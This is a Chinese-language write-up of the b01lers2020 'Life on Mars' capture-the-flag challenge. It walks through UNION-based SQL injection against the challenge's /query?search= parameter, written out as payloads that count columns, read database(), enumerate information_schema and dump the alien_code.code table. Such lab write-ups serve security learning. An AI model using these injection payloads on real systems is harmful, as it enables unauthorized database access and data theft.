---
title: '[b01lers2020]Life on Mars 1'
categories:
  - 
tags: []
abbrlink: 59ab7ddd
date: 2026-03-04 21:59:14
---
# [b01lers2020]Life on Mars

# 1

抓包,看js文件

http://6ce2d84e-f247-4291-af28-0c681a9eba07.node5.buuoj.cn:81/static/js/life_on_mars.js

```
function get_life(query) {
  $.ajax({
    type: "GET",
    url: "/query?search=" + query,
    data: "{}",
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    cache: false,
    success: function(data) {
      var table_html =
        '<table id="results"><tr><th>Name</th><th>Description</th></tr>';
      $.each(data, function(i, item) {
        table_html +=
          "<tr><td>" + data[i][0] + "</td><td>" + data[i][1] + "</td></tr>";
      });
      table_html += "</table>";

      $("#results").replaceWith(table_html);
    },

    error: function(msg) { }
  });
}
```

疑似注入点？

试试/query?search=Amazonis Planitia

不行，按照抓包得到的地址格式来

->/query?search=amazonis_planitia

![image-20260304213756128](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260304213756128.png)

回显正常

![image-20260304213903945](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260304213903945.png)



猜测后端语句

```
SELECT name, description FROM mars_locations WHERE region = amazonis_planitia
```

注入点个数

```
/query?search=amazonis_planitia order by 1
/query?search=amazonis_planitia order by 2
3回显不正常
```

回显位置

```
/query?search=amazonis_planitia union select 1，2

82	[ "1", "2" ]
```

查看库名

```
/query?search=amazonis_planitia union select 1,database()
82	[ "1", "aliens" ]
```

发现没有找到任何线索，去看看其他库

![image-20260304215340970](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260304215340970.png)

也不行，再去看看alien_code库

```
?search=amazonis_planitia union select 1,group_concat(table_name) from information_schema.tables where table_schema="alien_code";


?search=amazonis_planitia union select 1,group_concat(column_name) from information_schema.columns where table_name="code";


?search=amazonis_planitia union select 1,group_concat(code) from alien_code.code;
```

